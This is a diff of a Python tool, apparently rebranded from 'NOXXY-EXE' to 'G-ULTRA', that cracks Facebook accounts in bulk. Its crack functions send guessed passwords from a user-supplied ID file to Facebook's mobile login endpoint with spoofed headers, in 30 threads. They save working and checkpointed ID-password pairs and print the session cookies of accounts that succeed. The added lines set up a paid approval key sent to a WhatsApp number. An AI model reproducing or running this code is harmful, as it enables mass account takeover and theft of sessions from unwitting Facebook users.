@@ -1653,17 +1653,20 @@ logo ="""
 ⠄⠄⠄⠄⠉⢿⣿⣿⣿⣿⣼⣿⣧⣿⡿⣱⣿⣿⣿⣿⣿⣿⡿⠉⠂⠄⠄⠠
 ⠄⠄⠄⠄⠄⠄⠙⣿⣿⣿⢸⠿⢿⣫⣾⣿⣿⣿⣿⣿⣿⠟⠁⠄⠄⡠⠁⠄
 
-- 𝗧𝗛'𝟯 𝗠𝗘𝗧𝗔𝗩𝗘𝗥𝗦𝗘'𝟯 𝗚𝗢𝗗 𝗣𝗥𝗔𝗧𝗜𝗞 𝗜𝗡𝗫𝗫𝗜𝗗'𝟯 !
 
 \x1b[38;5;46m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥 \033[1;31m● \x1b[38;5;46m𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗚𝗜𝗧𝗛𝗨𝗕    \033[1;31m● \x1b[38;5;46m𝗵𝘁𝘁𝗽𝘀://𝗴𝗶𝘁𝗵𝘂𝗯.𝗰𝗼𝗺/𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗩𝗘𝗥𝗦𝗜𝗢𝗡  \033[1;31m ● \x1b[38;5;46m𝟵.𝟭
 \033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗧𝗢𝗢𝗟𝗦  \033[1;31m   ● \x1b[38;5;46m𝗙𝗥𝗘𝗘 𝗙𝗜𝗥𝗘, 𝗧𝗜𝗞𝗧𝗢𝗞, 𝗢𝗡𝗟𝗬 𝟭𝟬𝟬%
-\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗧𝗬𝗣𝗘  \033[1;31m    ● \x1b[38;5;46m- 𝗧𝗛'𝟯 𝗠𝗘𝗧𝗔𝗩𝗘𝗥𝗦𝗘'𝟯 𝗚𝗢𝗗 𝗣𝗥𝗔𝗧𝗜𝗞 𝗜𝗡𝗫𝗫𝗜𝗗'𝟯 !
+\033[1;31m[\033[1;32m=\033[1;31m]  \x1b[38;5;46m𝗢𝘄𝗻𝗲𝗿  \033[1;31m    ● \x1b[38;5;46m- 𝗧𝗛'𝟯 𝗠𝗘𝗧𝗔𝗩𝗘𝗥𝗦𝗘'𝟯 𝗚𝗢𝗗 𝗣𝗥𝗔𝗧𝗜𝗞 𝗜𝗡𝗫𝗫𝗜𝗗'𝟯 !
 \x1b[38;5;50m⋆\x1b[38;5;254m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[38;5;50m⋆"""
 balpakna =("""\x1b[38;5;50m══════════════════════════════════════════════════""")    
 meyermarexudi =(""" \033[0;97m=============================================""")    
+xudartimenai =(""" \033[32;1m[+] 𝗡𝗢 𝗠𝗢𝗥𝗘 -𝟯""")
+fuckyoursali =(""" \033[32;1m[𝟷] 𝗗𝗢𝗡'𝗧 𝗠𝗘𝗦𝗦 𝗪𝗜𝗧𝗛 𝗠𝗘 !""")
+xudinaministar =(""" \033[38;1m[-] 𝗜𝗠𝗣𝗢𝗥𝗧𝗘𝗡𝗧 𝗡𝗢𝗧𝗘""")
+hedaborakarent =(""" \033[35;1m[𝟸] - 𝗧𝗛'𝟯 𝗠𝗘𝗧𝗔𝗩𝗘𝗥𝗦𝗘'𝟯 𝗚𝗢𝗗 𝗣𝗥𝗔𝗧𝗜𝗞 𝗜𝗡𝗫𝗫𝗜𝗗'𝟯 ! """)
  
                   #____APPROVAL SYSTEM ADD_____#
 def meyexudi():
@@ -1672,6 +1675,7 @@ def meyexudi():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
+    httpCaht = requests.get('https://youtube.com/@PratikGrg-q6u').text
     if id in httpCaht:
       print(fuckyoursali)
       print(hedaborakarent)
@@ -1685,8 +1689,13 @@ def meyexudi():
       print('\033[38;5;46m╔══[∆]  𝗙𝗥𝗘𝗘-𝗙𝗜𝗥𝗘-𝗧𝗜𝗞-𝗧𝗢𝗞- 𝗜𝗗 𝗖𝗟𝗢𝗡𝗜𝗡𝗚')      
       print('\033[38;5;46m║══[∆]  𝗢𝗡𝗟𝗬 𝗔𝗖𝗧𝗜𝗩𝗘 𝗜𝗗 𝗖𝗟𝗢𝗡𝗘 𝟭𝟬𝟬%')
       print('\033[38;5;46m║══[∆]  𝗖𝗣 𝗜𝗗 𝗪𝗜𝗟𝗟 𝗕𝗘 𝗟𝗢𝗚𝗜𝗡 𝟴𝟬%')
-      print('\033[38;5;46m║══[∆]  𝗪𝗜-𝗙𝗜  𝗔𝗡𝗗 𝗗𝗔𝗧𝗔 𝗕𝗢𝗧𝗛 𝗪𝗢𝗥𝗞𝗜𝗡𝗚 𝟭𝟬𝟬%')
-      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   G,   ULTRA,"')      
+      print('\033[38;5;46m║══[∆]  𝗪𝗜-𝗙𝗜  𝗔𝗡𝗗 𝗗𝗔𝗧𝗔 𝗕𝗢𝗧𝗛 𝗪𝗢𝗥𝗞𝗜𝗡𝗚')
+      print('\033[38;5;46m║══[∆]  - 𝗧𝗛'𝟯 𝗠𝗘𝗧𝗔𝗩𝗘𝗥𝗦𝗘'𝟯 𝗚𝗢𝗗 𝗣𝗥𝗔𝗧𝗜𝗞 𝗜𝗡𝗫𝗫𝗜𝗗'𝟯 ! ')
+      print('\033[38;5;46m║══[∆]  𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘 ')
+      os.system('espeak -a 300 " Hello,   Sir,  Assalamualaikum,   I,   Am,    Robot,   of,   G,   ULTRA,    Please,   Send,   Your,   Key,"')
+      print("\x1b[0m║══[𝟮] 𝗬𝗢𝗨𝗥 𝗞𝗘𝗬 : "+id)
+      input('\033[1;30m╚══[𝟯]𝗜𝗙 𝗨 𝗪𝗔𝗡𝗧 𝗧𝗢 𝗕𝗨𝗬 𝗧𝗛𝗘𝗡 𝗣𝗥𝗘𝗦𝗦 𝗘𝗡𝗧𝗘𝗥 ')
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801912933782?text='+tks),approval()      
       time.sleep(1)
       meyexudi()
   except:
@@ -1700,6 +1709,20 @@ os.system('espeak -a 300 " Please,   Text,   Your,   Real,   Name,   Sir,"')
 uname =input('\033[1;91m[\033[1;91m•\033[1;91m]\033[1;33m 𝗪𝗛𝗔𝗧 𝗜𝗦 𝗬𝗢𝗨𝗥 𝗡𝗔𝗠𝗘\033[1;91m: \33[1;31m')
 os.system('espeak -a 300 " Welcome,   to,  G,ULTRA,  PAID,   Tools"')
 def back():
+	login()
+	
+	import getpass
+ 
+attemps = 0
+ 
+while attemps < 12345677901:
+    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m 𝗘𝗡𝗧𝗘𝗥 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: ')
+    password = input('\033[1;95m[\033[1;95m√\033[1;95m]\x1b[38;5;50m 𝗘𝗡𝗧𝗘𝗥 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: ')
+ 
+    if username == 'GALAXY' and password == 'WORLD':
+        print(' \033[0;95m𝗬𝗢𝗨 𝗛𝗔𝗩𝗘 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬 𝗟𝗢𝗚𝗚𝗘𝗗 𝗜𝗡.')
+        os.system('espeak -a 300 " Successfully,   Log,  In,  Sir"')
+        break
     else:
         print(' 𝗜𝗡𝗖𝗢𝗥𝗥𝗘𝗖𝗧 𝗣𝗔𝗦𝗦 𝗣𝗟𝗘𝗔𝗦𝗘 𝗧𝗥𝗬𝗜𝗡𝗚 ')
         attemps += 1
@@ -1776,10 +1799,11 @@ class jalan:
 def menu():
     os.system('clear')
     print(logo)
+    print(f"\033[95;1m[\033[95;1m+\033[95;1m] \033[1;95m𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘\033[1;91m :\033[1;96m "+uname)
     print("\033[97;1m[\033[92;1m•\033[97;1m] \033[0;93m𝗧𝗢𝗗𝗔𝗬'𝗦 𝗗𝗔𝗧𝗘 :\033[1;96m "+date)
     print('\033[38;5;46m===============================================')
     print(f"""\033[38;5;46m[\033[92;1m1\033[91;1m] \033[0;91m𝗙𝗜𝗟𝗘 𝗖𝗟𝗢𝗡𝗜𝗡𝗚         """)
-    print("""\033[38;5;46m[\033[95;1m2\033[95;1m] \033[0;95m𝗙𝗢𝗟𝗟𝗢𝗪 𝗠𝗬 𝗙𝗕 𝗔𝗖𝗖𝗢𝗨𝗡𝗧""")
+    print("""\033[38;5;46m[\033[95;1m2\033[95;1m] \033[0;95m𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗪𝗜𝗧𝗛 𝗔𝗗𝗠𝗜𝗡""")
     print(f"""\033[38;5;46m[\033[93;1m3\033[93;1m] \033[93;1m𝗖𝗛𝗘𝗖𝗞 𝗢𝗞 𝗜𝗗𝗭   """)
     print("""\033[38;5;46m[\033[98;1m0\033[98;1m] \033[0;98m𝗘𝗫𝗜𝗧""")
     print('\033[38;5;46m=================')
@@ -1790,7 +1814,7 @@ def menu():
     elif WASIM in ['1']:
         crack_file()
     elif WASIM in ['2','02']:
-        os.system('xdg-open https://github.com/NOXXY-EXE')
+        os.system('xdg-open https://github.com/galaxy90v')
         os.system("python nono.py")
     elif WASIM in ['3','03']:
         result()
@@ -1981,7 +2005,7 @@ def dump_massal():
 def crack_file():
     print('\033[0;93m==================')
     os.system('espeak -a 300 " your file name"')
-    print('\033[1;36m[ 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:  /sdcard/Noxxy.txt ]')
+    print('\033[1;36m[ 𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗘𝗫𝗔𝗠𝗣𝗟𝗘:  /sdcard/galaxy.txt ]')
     o = input('\033[95;1m[\033[92;1m+\033[95;1m] 𝗜𝗡𝗣𝗨𝗧 𝗙𝗜𝗟𝗘 𝗡𝗔𝗠𝗘 :\033[95;1m ')
     try:lin = open(o).read().splitlines()
     except:
@@ -2048,8 +2072,8 @@ def passwrd():
     print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗧𝗢𝗗𝗔𝗬'𝗦 𝗗𝗔𝗧𝗘 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
     print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;93m𝚈𝙾𝚄𝚁 𝗧𝗢𝗧𝗔𝗟 𝗜𝗗𝗭 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
     print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;95m𝗦𝗧𝗔𝗥𝗧𝗘𝗗 𝗬𝗢𝗨𝗥 𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗧𝗜𝗠𝗘 \033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
-    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗦𝗣𝗘𝗘𝗗 𝗦𝗨𝗣𝗘𝗥 𝗙𝗜𝗥𝗦𝗧")
-    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝗨𝗦𝗘=[𝗙𝗟𝗜𝗚𝗛𝗧 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 𝗦𝗣𝗘𝗘𝗗 𝗨𝗣] ')
+    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝗖𝗟𝗢𝗡𝗜𝗡𝗚 𝗦𝗣𝗥𝗘𝗘𝗗 𝗦𝗨𝗣𝗘𝗥 𝗙𝗜𝗥𝗦𝗧")
+    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;98m𝗨𝗦𝗘=[𝗙𝗟𝗜𝗚𝗛𝗧 𝗠𝗢𝗗𝗘 𝗙𝗢𝗥 𝗦𝗣𝗥𝗘𝗘𝗗 𝗨𝗣] ')
     print('\x1b[38;5;50m===============================================')
     with tred(max_workers=30) as pool:
         for yuzong in id2:
@@ -2175,7 +2199,7 @@ def crack(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘-𝗖𝗣🔒]𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤{pw}')
+                print(f'\r\033[38;5;46m[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗖𝗣🔒]𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤{pw}')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -2185,7 +2209,7 @@ def crack(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤ {pw}\n\033[0;91m[🍪]= 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 • \033[0;91m{kuki} ')
+                print(f'\r\033[38;5;46m[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤ {pw}\n\033[0;91m[🍪]= 𝗖𝗢𝗢𝗞𝗜𝗘𝗦 • \033[0;91m{kuki} ')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
@@ -2200,7 +2224,7 @@ def crack(idf,pwv):
  
 def crackfree(idf,pwv):
     global loop,ok,cp
-    sys.stdout.write(f"\r{H}[𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘•𝗠𝟮]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
+    sys.stdout.write(f"\r{H}[𝗚-𝗨𝗟𝗧𝗥𝗔•𝗠𝟮]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
     sys.stdout.flush()
     ua = random.choice(ugen)
     ua2 = random.choice(ugen2)
@@ -2217,7 +2241,7 @@ def crackfree(idf,pwv):
             heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
             po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
             if "checkpoint" in po.cookies.get_dict().keys():
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘-𝗖𝗣🔒] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
+                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗖𝗣🔒] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
                 os.system('espeak -a 300 " Sorry,  You,  Have,  Got,  Cp,  Id"')
                 open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                 akun.append(idf+' • '+pw)
@@ -2227,7 +2251,7 @@ def crackfree(idf,pwv):
                 ok+=1
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗡𝗢𝗫𝗫𝗬-𝗘𝗫𝗘-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
+                print(f'\r\033[38;5;46m[{time.strftime("%H:%M")}[𝗚-𝗨𝗟𝗧𝗥𝗔-𝗢𝗞🔓] 𝗨𝗜𝗗┏━➤ {idf} 𝗣𝗮𝘀𝘀┏━➤')
                 os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                 open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                 break
